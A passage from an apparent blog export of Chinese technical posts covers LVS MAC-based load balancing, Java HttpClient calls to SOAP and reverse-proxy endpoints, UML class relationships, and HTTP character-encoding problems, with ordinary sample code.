    <url>/blog/arch/lb/mac/</url>
    <content><![CDATA[<p>在TCP&#x2F;IP协议中数据链路层处于最底层，以帧的形式传输和接受数据。在这一层中MAC(Media Access Control)寻址是主要功能。在网络中MAC又称之为MAC地址，用于表示互联网上每个网卡的标识符，采用十六进制表示，共6个字节（48位），烧录在网卡内部。更形象的说MAC地址就像身份证号码，全球唯一。</p>
<p>以太网中数据帧之间是通过MAC寻址来到达对应的计算机网卡或者路由的，因此，服务器集群可以充分利用这一特性来进行负载均衡。</p>
<p>数据链路层负载均衡通过修改通信协议数据包的mac地址进行负载均衡，集群可以通过如下图的部署来达到负载均衡：</p>
<p><img src="/images/arch/balmac.jpg"></p>
<p>这种数据传输方式又称为三角传输，负载均衡数据分发过程中不修改IP地址，只修改目的MAC地址，通过配置真实物理服务器集群所有机器虚拟IP和负载均衡服务器IP一致，从而达到不修改数据包的源地址和目的地址就可以进行数据分发的目的，由于实际处理请求的真实物理服务器IP和数据请求目的IP一致，不需要通过负载均衡服务器进行地址交换，可将响应数据包直接返回给用户浏览器，避免负载均衡服务器网卡带宽成为瓶颈。这种负载均衡方式又称之为直接路由方式（DR）.</p>
<p>如上图所示，用户请求到达负载均衡服务器114.100.80.10后，负载均衡服务器将数据包的目的MAC地址更改为00: 0c: 29: d2，并不修改数据包目的IP，由于服务器集群所有服务器的虚拟IP地址和负载均衡服务器IP地址一致，因此数据可以正常传输到达MAC地址为00: 0c: 29: d2的机器上，该服务器处理完之后，将响应数据包发送到网关服务器，网关服务器直接将数据包发送给用户浏览器，响应数据不需要通过负载均衡服务器，这样就避免了负载均衡服务器成为传输瓶颈的可能。</p>
<p>使用三角传输模式的链路层负载均衡是目前大型网站使用最为广泛的一种负载均衡手段。在Linux平台上最好的链路层负载均衡开源产品是LVS(Linux Virtual Server)。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>负载均衡</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title>如何用HttpClient和xml报文调用webservice服务</title>
    <url>/blog/arch/rproxy/httpcallws/</url>
    <content><![CDATA[<p>依赖jar包：</p>
<p>httpclient-4.5.2.jar</p>
<p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.iteedu.demo.webservicesdk;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">import org.apache.http.HttpEntity;</span><br><span class="line">import org.apache.http.HttpStatus;</span><br><span class="line">import org.apache.http.client.ClientProtocolException;</span><br><span class="line">import org.apache.http.client.config.RequestConfig;</span><br><span class="line">import org.apache.http.client.methods.CloseableHttpResponse;</span><br><span class="line">import org.apache.http.client.methods.HttpPost;</span><br><span class="line">import org.apache.http.entity.StringEntity;</span><br><span class="line">import org.apache.http.impl.client.CloseableHttpClient;</span><br><span class="line">import org.apache.http.impl.client.HttpClients;</span><br><span class="line">import org.apache.http.util.EntityUtils;</span><br><span class="line"></span><br><span class="line">public class HelloWorldHttpClient &#123;</span><br><span class="line">	public static void main(String[] args) throws ClientProtocolException,</span><br><span class="line">			IOException &#123;</span><br><span class="line">		RequestConfig requestConfig = RequestConfig.custom()</span><br><span class="line">				.setConnectionRequestTimeout(30).setConnectTimeout(30)</span><br><span class="line">				.setSocketTimeout(30).build();</span><br><span class="line">		CloseableHttpClient httpClient = HttpClients.custom()</span><br><span class="line">				.setDefaultRequestConfig(requestConfig).build();</span><br><span class="line">		HttpPost httpPost = new HttpPost(&quot;http://localhost:8080/helloWorld&quot;);</span><br><span class="line">		StringEntity entity = new StringEntity(getRequestXML(), &quot;UTF-8&quot;);</span><br><span class="line">		httpPost.setEntity(entity);</span><br><span class="line">		httpPost.setHeader(&quot;Content-Type&quot;, &quot;text/xml; charset=&quot; + &quot;UTF-8&quot;);</span><br><span class="line">		httpPost.setHeader(&quot;SOAPAction&quot;, &quot;&quot;);</span><br><span class="line">		CloseableHttpResponse httpResponse = httpClient.execute(httpPost);</span><br><span class="line"></span><br><span class="line">		String result = null;</span><br><span class="line">		int iCode = httpResponse.getStatusLine().getStatusCode();</span><br><span class="line">		if (HttpStatus.SC_OK == iCode) &#123;</span><br><span class="line">			HttpEntity httpEntity = httpResponse.getEntity();</span><br><span class="line">			result = EntityUtils.toString(httpEntity, &quot;UTF-8&quot;);</span><br><span class="line">		&#125; else &#123; // 如果返回非200，则手动关闭连接</span><br><span class="line">			httpPost.abort();</span><br><span class="line">			System.out.println(&quot;get status code &#123;&#125; from server:&quot;</span><br><span class="line">					+ httpResponse.getStatusLine().getStatusCode());</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static String getRequestXML() &#123;</span><br><span class="line">		StringBuilder sb = new StringBuilder(&quot;&lt;soapenv:Envelope&quot;);</span><br><span class="line">		sb.append(&quot; xmlns:soapenv=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&quot;);</span><br><span class="line">		sb.append(&quot; xmlns:web=\&quot;http://webservicesdk.demo.iteedu.com/\&quot;&gt;&quot;);</span><br><span class="line">		sb.append(&quot;   &lt;soapenv:Header/&gt;&quot;);</span><br><span class="line">		sb.append(&quot;   &lt;soapenv:Body&gt;&quot;);</span><br><span class="line">		sb.append(&quot;      &lt;web:sayHiToUser&gt;&quot;);</span><br><span class="line">		sb.append(&quot;         &lt;arg0&gt;&quot;);</span><br><span class="line">		sb.append(&quot;         &lt;name&gt;assd&lt;/name&gt;&lt;/arg0&gt;&quot;);</span><br><span class="line">		sb.append(&quot;      &lt;/web:sayHiToUser&gt;&quot;);</span><br><span class="line">		sb.append(&quot;   &lt;/soapenv:Body&gt;&quot;);</span><br><span class="line">		sb.append(&quot;&lt;/soapenv:Envelope&gt;&quot;);</span><br><span class="line">		return sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>架构</category>
        <category>反向代理</category>
      </categories>
      <tags>
        <tag>webservice</tag>
        <tag>HttpClient</tag>
      </tags>
  </entry>
  <entry>
    <title>UML中类与类的关系，关联和依赖的区别</title>
    <url>/blog/arch/uml/classdiagram/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>类与类之间存在以下关系:</p>
<p><strong>泛化(Generalization)：</strong></p>
<p>在有接口时，可以分为”继承（extends）”和”实现（implements）”。</p>
<p><strong>关联(Association)：</strong></p>
<p>关联是一种结构关系，表现为一个对象能够获得另一个对象的实例引用并调用它的服务（即使用它）。</p>
<p>关联是类之间的词法连接，使一个类知道另一个类的公开属性和操作。关联有单向和双向之分。</p>
<p>是关联不是依赖的情况，一个类把另一个类做为属性，但没调用其任何属性和方法。如一个导航类有很多相似类引用，只供导航之用，本身不调用任何一个。</p>
<p>总之，一个类中把另一个类或其集合做为属性，关联关系就成成立。</p>
<p><strong>依赖(Dependency)：</strong></p>
<p>依赖是一种使用关系，表现为一个对象仅仅是调用了另一个对象的服务。</p>
<p>依赖性总是单向的，显示一个依赖于另一个类的定义。</p>
<p>如果两个元素其中一个的定义发生改变则会引起另一个元素发生变化则称这两个元素之间存在依赖关系，对于类来说，依赖可能存在于下列几种情况中：一个类要发送消息给另一个类；一个类将另一个类作为其数据的一部分；一个类的操作中将另一个类作为其参数。如果一个类改变了接口，则任何发送给该类的消息可能不再有效了。</p>
<p>是依赖不是关联的情况，类实例做参数、方法中创建类实例等。</p>
<p>总之，一个类主动修改了会造成另一个类被动修改，要不然会报错或功能实现不了，这就是有依赖关系。</p>
<p><strong>关联的种类</strong></p>
<p>聚合(Aggregation,空心菱形)</p>
<p>这是一种松散的对象间的关系.举个例子:计算机和他的外围设备就是一例。用来表示拥有关系或者整体与部分的关系。</p>
<ol>
<li>聚合有时能够不依赖部分而存在，有时又不能。</li>
<li>部分可以独立于聚合而存在。</li>
<li>如果有一部分遗失，聚合会给人一种不完全的感觉。</li>
<li>部分的所有权可以由几个聚合来共享，比如共享打印机。</li>
</ol>
<p>组合(Composite,实心菱形)</p>
<p>这是一种非常强的对象间的关系,举个例子,树和它的树叶之间的关系。在一个合成里，部分与整体的生命周期都是一样的。一个合成的新对象完全拥有对其组成部分的支配权，包括他们的创建和毁灭。</p>
<ol>
<li>部分某一时刻只能属于某一个组成。</li>
<li>组成唯一的负责处理它的所有部分–这就意味着负责他们的创建与销毁。</li>
<li>倘若对于部分的职责由其他对象来承担的话，组成也就可以放松这些职责。</li>
<li>如果组成销毁的话，它必须销毁所有的部分，或者把负责他们的权利转移给其他对象。</li>
</ol>
<p><strong>总结</strong></p>
<p>广义上说泛化和关联也是依赖的一种，因为类名的变化会引起泛化和关联的变化。</p>
<p>关联和依赖的四种对应关系。</p>
<p>1、无关联，无依赖</p>
<p>它们是无关的对象类。</p>
<p>4、有关联，有依赖</p>
<p>当然，这是最简单，也是最直接的实现了，它的意思也表达的最清楚。依赖的实施直接通过本身的关联引用进行。这时，对象间的耦合关系确实比较强了，看需要是否解耦或不变。</p>
<p>2、有关联，无依赖</p>
<p>一般用来为其它对象类导航到关联端对象的桥梁。关联对象之间除了相互存储引用外，没有进一步的行为。</p>
<p>3、无关联，有依赖</p>
<p>这是我们常常希望实现的松耦合关系的情景，对象之间没有直接的关联关系存在，所以它们没有直接存储对方的引用，使程序的可以更灵活地变动。但是为了获得对象的引用以便实施依赖行为，比如调用，发消息，访问等依赖操作，可以通过间接关联来定位对方。一般情况下，设计者会为依赖关系提供一个存取方法（如Spring的依赖注入）获取对象引用。</p>
<h2 id="泛化-Generalization"><a href="#泛化-Generalization" class="headerlink" title="泛化(Generalization)"></a>泛化(Generalization)</h2><p>[泛化]</p>
<p>表示类与类之间的继承关系，接口与接口之间的继承关系，或类对接口的实现关系。一般化的关系是从子类指向父类的，与继承或实现的方法相反。</p>
<p>[具体表现]</p>
<p>父类 父类实例＝new 子类()</p>
<p>[UML图](图1.1)</p>
<p><a href="/blog/uploads/2012/10/fh.jpg"><img src="/images/design/fh.jpg" title="fh">{.alignnone .wp-image-96 width&#x3D;”229”<br>height&#x3D;”144”}</a></p>
<p>图1.1 Animal类与Tiger类,Dog类的泛化关系</p>
<h2 id="依赖-Dependency"><a href="#依赖-Dependency" class="headerlink" title="依赖(Dependency)"></a>依赖(Dependency)</h2><p>[依赖]</p>
<p>对于两个相对独立的对象，当一个对象负责构造另一个对象的实例，或者依赖另一个对象的服务时，这两个对象之间主要体现为依赖关系。</p>
<p>[具体表现]</p>
<p>依赖关系表现在局部变量，方法的参数，以及对静态方法的调用</p>
<p>[现实例子]</p>
<p>比如说你要去拧螺丝，你是不是要借助(也就是依赖)螺丝刀(Screwdriver)来帮助你完成拧螺丝(screw)的工作</p>
<p>[UML表现](图1.2)</p>
<p><a href="/blog/uploads/2012/10/yl.jpg"><img src="/images/design/yl.jpg" title="yl">{.alignnone .size-full .wp-image-99<br>width&#x3D;”272” height&#x3D;”82”}</a></p>
<p>图1.2 Person类与Screwdriver类的依赖关系</p>
<h2 id="关联-Association"><a href="#关联-Association" class="headerlink" title="关联(Association)"></a>关联(Association)</h2><p>[关联]</p>
<p>对于两个相对独立的对象，当一个对象的实例与另一个对象的一些特定实例存在固定的对应关系时，这两个对象之间为关联关系。</p>
<p>[具体表现]</p>
<p>关联关系是使用实例变量来实现</p>
<p>[现实例子]</p>
<p>比如客户和订单，每个订单对应特定的客户，每个客户对应一些特定的订单；再例如公司和员工，每个公司对应一些特定的员工，每个员工对应一特定的公司</p>
<p>[UML图] (图1.3)</p>
<p><a href="/blog/uploads/2012/10/gl.jpg"><img src="/images/design/gl.jpg" title="gl">{.alignnone .size-full .wp-image-97<br>width&#x3D;”291” height&#x3D;”57”}</a></p>
<p>图1.3 公司和员工的关联关系</p>
<h3 id="聚合（Aggregation）"><a href="#聚合（Aggregation）" class="headerlink" title="聚合（Aggregation）"></a>聚合（Aggregation）</h3><p>[聚合]</p>
<p>当对象A被加入到对象B中，成为对象B的组成部分时，对象B和对象A之间为聚集关系。聚合是关联关系的一种，是较强的关联关系，强调的是整体与部分之间的关系。</p>
<p>[具体表现]</p>
<p>与关联关系一样，聚合关系也是通过实例变量来实现这样关系的。关联关系和聚合关系来语法上是没办法区分的，从语义上才能更好的区分两者的区别。</p>
<p>[关联与聚合的区别]</p>
<p>(1)关联关系所涉及的两个对象是处在同一个层次上的。比如人和自行车就是一种关联关系，而不是聚合关系，因为人不是由自行车组成的。</p>
<p>聚合关系涉及的两个对象处于不平等的层次上，一个代表整体，一个代表部分。比如电脑和它的显示器、键盘、主板以及内存就是聚集关系，因为主板是电脑的组成部分。</p>
<p>(2)对于具有聚集关系（尤其是强聚集关系）的两个对象，整体对象会制约它的组成对象的生命周期。部分类的对象不能单独存在，它的生命周期依赖于整<br>体类的对象的生命周期，当整体消失，部分也就随之消失。比如张三的电脑被偷了，那么电脑的所有组件也不存在了，除非张三事先把一些电脑的组件（比如硬盘和<br>内存）拆了下来。</p>
<p>[UML图](图1.4)</p>
<p><a href="/blog/uploads/2012/10/jh.jpg"><img src="/images/design/jh.jpg" title="jh">{.alignnone .wp-image-98 width&#x3D;”298”<br>height&#x3D;”178”}</a></p>
<p>图1.4 电脑和组件的聚合关系</p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>UML</tag>
      </tags>
  </entry>
  <entry>
    <title>反向代理之http请求分析</title>
    <url>/blog/arch/rproxy/httpparse/</url>
    <content><![CDATA[<p>主要分析http请求内容，分析对象：</p>
<pre><code>HttpServletRequest request
</code></pre>
<p>取出所有请求头和参数：</p>
<pre><code>Map&lt;String, String&gt; headers=new HashMap&lt;String, String&gt;();
for (Enumeration&lt;String&gt; e = request.getHeaderNames(); e
        .hasMoreElements();) &#123;
    String name = e.nextElement().toString();
    headers.put(name, request.getHeader(name));
&#125;
Map&lt;String, String&gt; param=new HashMap&lt;String, String&gt;();
for(Enumeration&lt;String&gt; e=request.getParameterNames();e
        .hasMoreElements();)&#123;
    String name = e.nextElement().toString();
    param.put(name, request.getParameter(name));
&#125;
</code></pre>
<p>取出所有请求体：</p>
<pre><code>byte[] data=IOUtils.readBytesFromStream(request.getInputStream());
String strData=new String(data,&quot;utf-8&quot;);
</code></pre>
<p>取参数<code>request.getParameter(name)</code>和取请求体<code>IOUtils.readBytesFromStream(request.getInputStream())</code>不能同时用，因为两个操作都会读InputStream，但InputStream只能读一次，第二次读返回为空。</p>
<p>但<code>IOUtils.readBytesFromStream(request.getInputStream())</code>不影响请求头的读取。</p>
<h2 id="普通请求代码"><a href="#普通请求代码" class="headerlink" title="普通请求代码"></a>普通请求代码</h2><pre><code>String strUrl = &quot;http://localhost:8080/front_new/rproxy/123/456&quot;;
Map&lt;String, String&gt; requestParams = new HashMap&lt;String, String&gt;();
Map&lt;String, Object&gt; head = new HashMap&lt;String, Object&gt;();
head.put(&quot;headkey1&quot;, &quot;headkey1value&quot;);
String jsonHead = JSONObject.toJSONString(head);
Map&lt;String, Object&gt; content = new HashMap&lt;String, Object&gt;();
content.put(&quot;contentKey1&quot;, &quot;contentKey1value&quot;);
content.put(&quot;contentKey2&quot;, &quot;contentKey3value&quot;);
String jsonContent = JSONObject.toJSONString(content);
requestParams.put(&quot;jsonHead&quot;, jsonHead);
requestParams.put(&quot;jsonContent&quot;, jsonContent);
PostMethod postMethod = null;
HttpClient httpClient = new HttpClient();
// 设置超时时间
httpClient.getHttpConnectionManager().getParams()
        .setConnectionTimeout(30000);
httpClient.getHttpConnectionManager().getParams().setSoTimeout(30000);
postMethod = new PostMethod(strUrl);
int i = 0;
NameValuePair[] nvps = new NameValuePair[requestParams.size()];
for (String strKey : requestParams.keySet()) &#123;
    NameValuePair nvp = new NameValuePair();
    nvp.setName(strKey);
    nvp.setValue(requestParams.get(strKey));
    nvps[i] = nvp;
    i++;
&#125;
postMethod.setRequestBody(nvps);
httpClient.executeMethod(postMethod);
String resultStr = postMethod.getResponseBodyAsString();
System.err.println(resultStr);
</code></pre>
<p>请求头：</p>
<pre><code>&#123;Host=localhost:8080,
Content-Length=157,
User-Agent=Jakarta Commons-HttpClient/3.1,
Content-Type=application/x-www-form-urlencoded&#125;
</code></pre>
<p>请求内容：</p>
<pre><code>&#123; jsonHead =&#123; &quot;headkey1&quot; : &quot;headkey1value&quot; &#125;,
 jsonContent =&#123; &quot;contentKey1&quot; : &quot;contentKey1value&quot;,
 &quot;contentKey2&quot; : &quot;contentKey3value&quot; &#125;&#125;
</code></pre>
<p>请求流内容：</p>
<pre><code>jsonHead=%7B%22headkey1%22%3A%22headkey1value%22%7D&amp;jsonContent=%7B%22contentKey1%22%3A%22contentKey1value%22%2C%22contentKey2%22%3A%22contentKey3value%22%7D
</code></pre>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><pre><code>DefaultHttpClient httpclient = new DefaultHttpClient();
// 设置超时时间
HttpPost httppost = new HttpPost(
        &quot;http://localhost:8080/front_new/rproxy/123/456&quot;);
FileBody bin = new FileBody(new File(&quot;F:/aaa.txt&quot;));
FileBody bin2 = new FileBody(new File(&quot;F:/bbb.txt&quot;));
StringBody comment = new StringBody(&quot;adfadsfasdf&quot;);
MultipartEntity reqEntity = new MultipartEntity();
reqEntity.addPart(&quot;file1&quot;, bin);// file1为请求后台的File upload;属性
reqEntity.addPart(&quot;file2&quot;, bin2);// file2为请求后台的File upload;属性
reqEntity.addPart(&quot;filename1&quot;, comment);// filename1为请求后台的普通参数;属性
httppost.setEntity(reqEntity);
HttpResponse response = httpclient.execute(httppost);
</code></pre>
<p>header:</p>
<pre><code>&#123;Host=localhost:8080,
Content-Length=686,
User-Agent=Apache-HttpClient/4.5.2 (Java/1.7.0_67),
Connection=keep-alive,
Content-Type=multipart/form-data;
boundary=uj-cDkEsr2eER-jIpm2EaVBmVST_Mtte1AJR;
charset=US-ASCII&#125;
</code></pre>
<p>请求参数为空。</p>
<p>请求体为：</p>
<pre><code>--aKJdjfxWzYZm2BpDBoDCod15aGKE0a_r96-V
Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;aaa.txt&quot;
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

 这是测试文件。
这是测试文件。
这是测试文件。
--aKJdjfxWzYZm2BpDBoDCod15aGKE0a_r96-V
Content-Disposition: form-data; name=&quot;file2&quot;; filename=&quot;bbb.txt&quot;
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary

 这是测试文件。
这是测试文件。
这是测试文件。
--aKJdjfxWzYZm2BpDBoDCod15aGKE0a_r96-V
Content-Disposition: form-data; name=&quot;filename1&quot;
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 8bit

adfadsfasdf
--aKJdjfxWzYZm2BpDBoDCod15aGKE0a_r96-V--
</code></pre>
<p>两个文件都为utf-8编码，内容都为</p>
<pre><code>这是测试文件。
这是测试文件。
这是测试文件。
</code></pre>
<h2 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h2><p>普通请求为</p>
<pre><code>application/x-www-form-urlencoded
</code></pre>
<p>一般的表示提交，数据为key&#x3D;value形式数据。</p>
<p>可以用<code>request.getParameter(name)</code>取出参数。</p>
<p>文件上传为</p>
<pre><code>multipart/form-data
</code></pre>
<p>不能用<code>request.getParameter(name)</code>取出参数。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>反向代理</category>
      </categories>
      <tags>
        <tag>HttpClient</tag>
      </tags>
  </entry>
  <entry>
    <title>反向代理之http响应乱码分析</title>
    <url>/blog/arch/rproxy/responsecharset/</url>
    <content><![CDATA[<h2 id="服务器响应测试代码"><a href="#服务器响应测试代码" class="headerlink" title="服务器响应测试代码"></a>服务器响应测试代码</h2><p>UTF-8字符集</p>
<pre><code>response.setHeader(&quot;Content-Type&quot;, &quot;application/json;charset=UTF-8&quot;);
response.getWriter().append(&quot;&#123;\&quot;resp_msg\&quot;:\&quot;查询失败，查询条件不能为空\&quot;,\&quot;resp_code\&quot;:\&quot;9999\&quot;&#125;&quot;);
</code></pre>
<p>GBK字符集</p>
<pre><code>response.setHeader(&quot;Content-Type&quot;, &quot;application/json;charset=GBK&quot;);
response.getWriter().append(&quot;&#123;\&quot;resp_msg\&quot;:\&quot;查询失败，查询条件不能为空\&quot;,\&quot;resp_code\&quot;:\&quot;9999\&quot;&#125;&quot;);
</code></pre>
<h2 id="客户端响应解析代码"><a href="#客户端响应解析代码" class="headerlink" title="客户端响应解析代码"></a>客户端响应解析代码</h2><pre><code>httpClient.executeMethod(postMethod);
String strData=new String(postMethod.getResponseBody());
String strData1=new String(postMethod.getResponseBody(),&quot;UTF-8&quot;);
String strData2=new String(postMethod.getResponseBody(),&quot;GBK&quot;);
String resultStr = postMethod.getResponseBodyAsString();
</code></pre>
<h2 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h2><p><code>postMethod.getResponseBody()</code>会取到响应结果的byte[]数组，创建字符串时只有和<code>response.setHeader</code>中设置的字符集一致才不会乱码。</p>
<p><code>postMethod.getResponseBodyAsString()</code>会自动取响应头<code>Content-Type</code>的编码做字符串解码，所以总是会得到正确的结果。</p>
<p><code>postMethod.getResponseBodyAsString()</code>的内部代码</p>
<pre><code>public String getResponseBodyAsString() throws IOException &#123;
    byte[] rawdata = null;
    if (responseAvailable()) &#123;
        rawdata = getResponseBody();
    &#125;
    if (rawdata != null) &#123;
        return EncodingUtil.getString(rawdata, getResponseCharSet());
    &#125; else &#123;
        return null;
    &#125;
&#125;
public String getResponseCharSet() &#123;
    return getContentCharSet(getResponseHeader(&quot;Content-Type&quot;));
&#125;
</code></pre>
<h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>服务器会根据响应头<code>Content-Type</code>的编码对返回字符串做解码，类似<code>str.getBytes(Content-Type响应头编码)</code>。</p>
<p>客户端<code>postMethod</code>从流中取出的byte数组就是服务器解码的数组，要想得到正确的结果就要做<code>new String(byte[],Content-Type响应头编码)</code>生成字符串。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>反向代理</category>
      </categories>
      <tags>
        <tag>HttpClient</tag>
      </tags>
  </entry>
  <entry>
    <title>反向代理之HttpClient4基本使用</title>
    <url>/blog/arch/rproxy/httpclient4base/</url>
    <content><![CDATA[<h2 id="构建NameValue参数"><a href="#构建NameValue参数" class="headerlink" title="构建NameValue参数"></a>构建NameValue参数</h2><pre><code>private static HttpPost buildKvHttpPost(String strUrl,
        Map&lt;String, String&gt; requestParams)
        throws UnsupportedEncodingException &#123;
    List&lt;NameValuePair&gt; nvps = new ArrayList&lt;&gt;();
    for (String strKey : requestParams.keySet()) &#123;
        nvps.add(new BasicNameValuePair(strKey,requestParams.get(strKey)));
    &#125;
    HttpPost post=new HttpPost(strUrl);
    post.setEntity(new UrlEncodedFormEntity(nvps, &quot;UTF-8&quot;));
    return post;
&#125;
</code></pre>
<h2 id="构建Json报文参数"><a href="#构建Json报文参数" class="headerlink" title="构建Json报文参数"></a>构建Json报文参数</h2><pre><code>    private static HttpPost buildJsonHttpPost(String strUrl, String body)
        throws UnsupportedEncodingException &#123;
    StringEntity entity = new StringEntity(body,ContentType.create(&quot;application/json&quot;,&quot;UTF-8&quot;));
    HttpPost post=new HttpPost(strUrl);
    post.setEntity(entity);
    return post;
&#125;
</code></pre>
<h2 id="获取返回结果"><a href="#获取返回结果" class="headerlink" title="获取返回结果"></a>获取返回结果</h2><pre><code>private String getRespString(HttpPost httpPost) throws ParseException, IOException&#123;
    CloseableHttpClient httpClient = HttpClients.createDefault();
    CloseableHttpResponse resp=httpClient.execute(httpPost);
    HttpEntity entity=resp.getEntity();
    ContentType ct=ContentType.getOrDefault(entity);
    String resultStr = EntityUtils.toString(entity , ct.getCharset()).trim();
    System.out.println(resultStr);
    return resultStr;
&#125;
</code></pre>
<h2 id="整体转发请求"><a href="#整体转发请求" class="headerlink" title="整体转发请求"></a>整体转发请求</h2><pre><code>HttpPost httpPost = new HttpPost(servcieUrl);
InputStreamEntity entity = new InputStreamEntity(
        request.getInputStream());
httpPost.setEntity(entity);
for (Enumeration&lt;String&gt; e = request.getHeaderNames(); e
        .hasMoreElements();) &#123;
    String name = e.nextElement().toString();
    if (&quot;Content-Length&quot;.equals(name)) &#123;
        continue;
    &#125;
    httpPost.setHeader(name, request.getHeader(name));
&#125;
</code></pre>
]]></content>
      <categories>
        <category>架构</category>
        <category>反向代理</category>
      </categories>
      <tags>
        <tag>HttpClient</tag>
      </tags>
  </entry>
  <entry>
    <title>反向代理之http请求乱码分析</title>
    <url>/blog/arch/rproxy/requestcharset/</url>
    <content><![CDATA[<h2 id="请求测试代码"><a href="#请求测试代码" class="headerlink" title="请求测试代码"></a>请求测试代码</h2><pre><code>import java.util.HashMap;
import java.util.Map;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.methods.PostMethod;

public class HttpCharsetTest &#123;
    public static void main(String[] args) throws Exception &#123;
        String strUrl = &quot;http://localhost:8080/front_new/rproxy/123/456&quot;;
        Map&lt;String, String&gt; requestParams = new HashMap&lt;String, String&gt;();
        requestParams.put(&quot;testkey&quot;, &quot;测试&quot;);
        int i = 0;
        NameValuePair[] nvps = new NameValuePair[requestParams.size()];
        for (String strKey : requestParams.keySet()) &#123;
            NameValuePair nvp = new NameValuePair();
            nvp.setName(strKey);
            nvp.setValue(requestParams.get(strKey));
            nvps[i] = nvp;
            i++;
        &#125;
        PostMethod postMethod = null;
        HttpClient httpClient = new HttpClient();
        // 设置超时时间
        httpClient.getHttpConnectionManager().getParams()
                .setConnectionTimeout(30000);
        httpClient.getHttpConnectionManager().getParams().setSoTimeout(30000);
        postMethod = new PostMethod(strUrl);
        postMethod.setRequestBody(nvps);
//		postMethod.addRequestHeader(&quot;Content-Type&quot;, &quot;text/html;charset=UTF-8&quot;);
//		httpClient.getParams().setContentCharset(&quot;UTF-8&quot;);
//		postMethod.getParams().setContentCharset(&quot;UTF-8&quot;);
        httpClient.executeMethod(postMethod);
        String resultStr = postMethod.getResponseBodyAsString();
        System.err.println(resultStr);
    &#125;
&#125;
</code></pre>
<p>httpClient请求编码设置</p>
<pre><code>postMethod.addRequestHeader(&quot;Content-Type&quot;, &quot;text/html;charset=UTF-8&quot;);
httpClient.getParams().setContentCharset(&quot;UTF-8&quot;);
postMethod.getParams().setContentCharset(&quot;UTF-8&quot;);
</code></pre>
<p>以上三种方式，下面的设置方法会覆盖上面的设置。</p>
<h2 id="内容查看代码"><a href="#内容查看代码" class="headerlink" title="内容查看代码"></a>内容查看代码</h2><p>获取请求完整内容：</p>
<pre><code>byte[] data=IOUtils.readBytesFromStream(request.getInputStream());
String strData=new String(data);
String strDecode=URLDecoder.decode(strData, &quot;UTF-8&quot;);
</code></pre>
<h2 id="内容测试"><a href="#内容测试" class="headerlink" title="内容测试"></a>内容测试</h2><p>不同的httpClient请求编码，参数内容“测试”二字，方式post，<code>strData</code>内容如下：</p>
<pre><code>不设置字符集
testkey=%3F%3F
UTF-8字符集
testkey=%E6%B5%8B%E8%AF%95
GBK字符集
testkey=%B2%E2%CA%D4
</code></pre>
<p>如果不设置字符集，每个汉字编码成占一个字节的编码，没找到任何一个编码与之对应<code>URLDecoder.decode</code>后是乱码。</p>
<p>UTF-8编码成三个字节一个汉字，GBK编码成二个字节一个汉字，用对应编码<code>URLDecoder.decode</code>后都是正常汉字。</p>
<h2 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数"></a>获取请求参数</h2><p>在获取参数调用<code>request.getParameter</code>前，要设置字符编码：</p>
<pre><code>request.setCharacterEncoding(&quot;UTF-8&quot;);
</code></pre>
<p>可以通过设置spring的filter统一设置编码：</p>
<pre><code>&lt;filter&gt;
  &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;
  &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;
  &lt;init-param&gt;
    &lt;param-name&gt;encoding&lt;/param-name&gt;
    &lt;param-value&gt;UTF-8&lt;/param-value&gt;
  &lt;/init-param&gt;
  &lt;init-param&gt;
    &lt;param-name&gt;forceEncoding&lt;/param-name&gt;
    &lt;param-value&gt;true&lt;/param-value&gt;
  &lt;/init-param&gt;
&lt;/filter&gt;
&lt;filter-mapping&gt;
  &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;
  &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/filter-mapping&gt;
</code></pre>
<p>spring的filter的实质：</p>
<pre><code>@Override
protected void doFilterInternal(
        HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
        throws ServletException, IOException &#123;

    if (this.encoding != null &amp;&amp; (this.forceEncoding || request.getCharacterEncoding() == null)) &#123;
        request.setCharacterEncoding(this.encoding);
        if (this.forceEncoding) &#123;
            response.setCharacterEncoding(this.encoding);
        &#125;
    &#125;
    filterChain.doFilter(request, response);
&#125;
</code></pre>
<p>encoding的作用相当于：</p>
<pre><code>request.setCharacterEncoding
</code></pre>
<p>forceEncoding为true的作用相当于：</p>
<pre><code>request.setCharacterEncoding(“”);
response.setCharacterEncoding(“”);
</code></pre>
<h2 id="乱码详解"><a href="#乱码详解" class="headerlink" title="乱码详解"></a>乱码详解</h2><p>一个Http请求的数据大致包括URI、Header、和Body三个部分。这三个部分都需要encoding，不过一般只涉及到URI和Body，因此就不讨论Header了。</p>
<p>GET的请求参数在QueryString中，是URI的一部分。因此，对于GET请求，我们需要关注，URI是如何encoding的？</p>
<p>POST的请求参数在Body中，因此，对于POST请求，我们则需要关注，Body是如何encoding的？</p>
